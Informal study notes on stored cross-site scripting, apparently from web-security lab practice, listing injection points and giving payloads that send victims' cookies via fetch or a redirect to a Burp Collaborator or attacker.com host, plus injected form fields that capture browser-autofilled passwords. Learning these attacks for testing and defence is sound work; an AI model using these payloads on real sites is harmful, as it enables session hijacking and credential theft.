it hapens when user input is directly stored within the website and that too inside the database of website
here database is not merely and db but it can be the page or log in which it can be stored in 

how to find stored XSS:

    Parameters or other data within the URL query string and message body.
    The URL file path.
    HTTP request headers that might not be exploitable in relation to reflected XSS.
    Any out-of-band routes via which an attacker can deliver data into the application. 
The routes that exist depend entirely on the functionality implemented by the application: a webmail application will process data received in emails;
an application displaying a Twitter feed might process data contained in third-party tweets; and a news aggregator will include data originating on other web sites.


1. direct stored xss with nothing encoded
in rthis attack we can directly store our malicios javascript and it will be stored

2. stored XSS to steal user cookie using fetch method 
so we can use paylaod like this:
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script> we can also try to use different payload than this

like :
 <script>window.location='http//attacker.com/cookie='document.cookie</script> ----> make ue of requestbin


3. stored xss to steal username and password ---> this type of attack onkly works when password is saved in browser and password autofill is enables in websites 
we can create input fields for password and usernames that will be autofilled when users try to access a page and then we can trigger the javascript to sen the data to us
eg how thica can be performed :

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">                 ----------> what is happening = username and password fields are empty originally so when autofill is doen we hava an event called onchange which we set 
for password value now when it is cahnged it will call using fetch value using username and password




